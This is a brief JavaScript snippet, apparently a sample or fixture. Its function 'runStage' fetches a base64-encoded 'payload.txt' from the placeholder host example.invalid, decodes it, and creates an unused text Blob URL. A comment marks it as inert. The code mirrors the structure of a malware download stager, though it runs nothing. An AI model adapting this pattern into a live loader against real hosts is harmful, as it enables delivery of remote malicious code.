async function runStage() {
  const response = await fetch("https://example.invalid/payload.txt");
  const encoded = await response.text();
  const decoded = atob(encoded);
  const blob = new Blob([decoded], { type: "text/plain" });
  URL.createObjectURL(blob);
}

// inert network placeholder and inert blob creation only
